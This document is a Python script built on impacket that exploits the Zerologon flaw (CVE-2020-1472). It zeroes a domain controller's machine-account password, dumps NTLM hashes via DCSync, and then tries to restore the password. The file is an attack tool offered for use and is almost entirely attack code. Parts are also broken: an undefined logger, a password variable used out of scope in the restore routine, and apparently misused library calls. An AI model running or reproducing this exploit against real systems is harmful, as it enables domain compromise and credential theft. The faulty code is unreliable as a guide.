#!/usr/bin/env python3

import sys
import argparse
import logging
import codecs
from getpass import getpass
from impacket.dcerpc.v5 import nrpc, epm, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples.secretsdump import NTDSHashes
from impacket import version
from struct import pack, unpack
from binascii import unhexlify

MAX_ATTEMPTS = 2000  # Max attempts for Zerologon attack

def fail(msg):
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)

def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + '\x00', ciphertext, flags
        )
        assert server_auth['ErrorCode'] == 0
        return True
    except nrpc.DCERPCSessionError as ex:
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')

def exploit(dc_handle, rpc_con, target_computer):
    request = nrpc.NetrServerPasswordSet2()
    request['PrimaryName'] = dc_handle + '\x00'
    request['AccountName'] = target_computer + '$\x00'
    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = 0
    request['Authenticator'] = authenticator
    request['ComputerName'] = target_computer + '\x00'
    request['ClearNewPassword'] = b'\x00' * 516
    return rpc_con.request(request)

def perform_attack(dc_handle, dc_ip, target_computer):
    print('Performing authentication attempts...')
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    for attempt in range(MAX_ATTEMPTS):
        result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
        if result is None:
            print('=', end='', flush=True)
        else:
            break

    if result:
        print('\nTarget vulnerable, changing account password to empty string')
        result = None
        for attempt in range(MAX_ATTEMPTS):
            try:
                result = exploit(dc_handle, rpc_con, target_computer)
                if result['ErrorCode'] == 0:
                    print('\nExploit complete!')
                    return True
            except nrpc.DCERPCSessionError as ex:
                if ex.get_error_code() == 0xc0000022:
                    pass
                else:
                    fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
            except BaseException as ex:
                fail(f'Unexpected error: {ex}.')
            print('=', end='', flush=True)

        if result['ErrorCode'] != 0:
            print('Non-zero return code, something went wrong?')
    else:
        print('\nAttack failed. Target is probably patched.')
        sys.exit(1)
    return False

def dcsync(dc_ip, username, password, domain, target_dc):
    print('Performing DCsync operation...')
    target = f'{domain}/{username}:{password}@{target_dc}'
    secretsdump = NTDSHashes(target, dc_ip, None, isRemote=True, justNTLM=True)
    secretsdump.dump()
    secretsdump.cleanup()

def restore_password(dc_handle, dc_ip, target_computer, original_password):
    print(f'Restoring password for {target_computer}...')
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    challenge = b'12345678'
    resp = nrpc.hNetrServerReqChallenge(rpc_con, NULL, dc_handle + '\x00', challenge)
    serverChallenge = resp['ServerChallenge']

    ntHash = unhexlify(password)
    sessionKey = nrpc.ComputeSessionKeyAES('', challenge, serverChallenge)
    ppp = nrpc.ComputeNetlogonCredentialAES(challenge, sessionKey)
    
    try:
        nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, dc_handle + '\x00', ppp, 0x212fffff)
    except Exception as e:
        if str(e).find('STATUS_DOWNGRADE_DETECTED') < 0:
            raise
    
    clientStoredCredential = pack('<Q', unpack('<Q', ppp)[0] + 10)
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = nrpc.ComputeNetlogonCredentialAES(clientStoredCredential, sessionKey)
    authenticator['Timestamp'] = 10

    request = nrpc.NetrServerPasswordSet2()
    request['PrimaryName'] = dc_handle + '\x00'
    request['AccountName'] = target_computer + '$\x00'
    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    request['Authenticator'] = authenticator
    request['ComputerName'] = target_computer + '\x00'
    encpassword = nrpc.ComputeNetlogonCredentialAES(original_password.encode('utf-16le') + b'\x00' * (516 - len(original_password) * 2), sessionKey)
    request['ClearNewPassword'] = encpassword

    result = rpc_con.request(request)
    print('Password restore result: ', result['ErrorCode'])
    if result['ErrorCode'] == 0:
        print('Password restored successfully.')
    else:
        print('Failed to restore password.')

def main():
    parser = argparse.ArgumentParser(description="Exploit Zerologon (CVE-2020-1472), perform DCsync, and restore the original password.")
    parser.add_argument("dc_name", help="NetBIOS name of the domain controller")
    parser.add_argument("dc_ip", help="IP address of the domain controller")
    parser.add_argument("username", help="Username with privileges to perform DCsync")
    parser.add_argument("--password", help="Password for the provided username")
    parser.add_argument("--domain", help="Domain name", default="")
    parser.add_argument("--original_password", help="Original password to restore for the DC computer account")

    args = parser.parse_args()

    if not args.password:
        args.password = getpass("Password: ")

    if not args.original_password:
        args.original_password = getpass("Original password to restore: ")

    dc_handle = '\\\\' + args.dc_name
    victim = args.dc_name

    if perform_attack(dc_handle, args.dc_ip, victim):
        dcsync(args.dc_ip, args.username, args.password, args.domain, args.dc_ip)
        restore_password(dc_handle, args.dc_ip, victim, args.original_password)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    logger.init()
    if sys.stdout.encoding is None:
        sys.stdout = codecs.getwriter('utf-8')(sys.stdout)
    print(version.BANNER)
    main()
